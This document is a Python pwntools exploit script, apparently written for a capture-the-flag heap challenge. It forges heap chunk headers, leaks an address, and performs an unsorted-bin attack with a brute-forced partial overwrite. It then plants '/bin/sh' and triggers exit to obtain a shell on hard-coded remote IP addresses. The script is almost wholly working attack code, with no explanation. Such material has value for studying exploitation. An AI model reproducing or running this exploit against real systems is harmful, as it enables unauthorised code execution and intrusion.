from pwn import *

#context.log_level = 'debug'

def edit(offset,data):
    p.sendlineafter('Input your choice:','1')
    p.recvuntil('Input the offset :')
    p.sendline(str(offset))
    p.recvuntil('Input the length :')
    p.sendline(str(len(data)))
    p.recvuntil('Input the content :')
    p.send(data)

def delete(offset):
    p.sendlineafter('Input your choice:','2')
    p.recvuntil('Input the offset :')
    p.sendline(str(offset))

def log_():
    p.sendlineafter('Input your choice:','3')

def exit_():
    p.sendlineafter('Input your choice:','4')

def exp():
    data = int(p.recvuntil('I')[:-2],16)
    data1 = data & 0xF0
    data2 = data >> 8
    log.success('leak :'+hex(data))

    edit(0x0,p64(0)+p64(0x1a1))
    edit(0x1a0,p64(0)+p64(0x21))
    edit(0x1c0,p64(0)+p64(0x21))
    
    edit(0x140+0xc0,p64(0x0))#mode
    edit(0x140+0x20,p64(0x0))#base
    edit(0x140+0x28,p64(0x1))#ptr
    #edit(0x140+0xd8,)
    
    edit(0x300,p64(0)+p64(0x91))
    edit(0x390,p64(0)+p64(0x21))
    edit(0x3b0,p64(0)+p64(0x21))
    
    edit(0x200,p64(0)+p64(0x91))
    edit(0x290,p64(0)+p64(0x21))
    edit(0x2b0,p64(0)+p64(0x21))

    delete(0x210)#small bin
    delete(0x310)#get the mmap addr

    delete(0x10)#put 0x1a0 chunk into unsort bin

    log_()#get the 0x60 chunk
    
    edit(0x158,'\x10' + chr(5+(data1+0x90)%0x100))#change bk-> unsort bin attack
    
    #edit(0x218,p64(0x23330000))
    
    edit(0x300+0x18,'\x90'+chr(3+(data1 + 0x90)%0x100)+chr(0xa0+(data2+8)%0x10))#a is not true ---> 1/256
    #edit(0x300+0x18,'\x90' + chr(3+(data1 + 0x90)%0x100) + '\xa5') #test->no asl
    #gdb.attach(p)
    edit(0x140,'/bin/sh\x00')

    #gdb.attach(p)
    exit_()

    p.sendline("echo 'flag'")
    p.recvuntil('flag')


if __name__ == '__main__' :
    flag = 1
    while flag :
        #p = process('./pwn')
        #p = remote('183.60.136.226',16145)
        p = remote('110.80.136.34',15321)
        libc = ELF('./libc.so')
        try:
            exp()
        except Exception,e:
            p.close()
            continue
        else:
            flag = 0
    p.interactive()
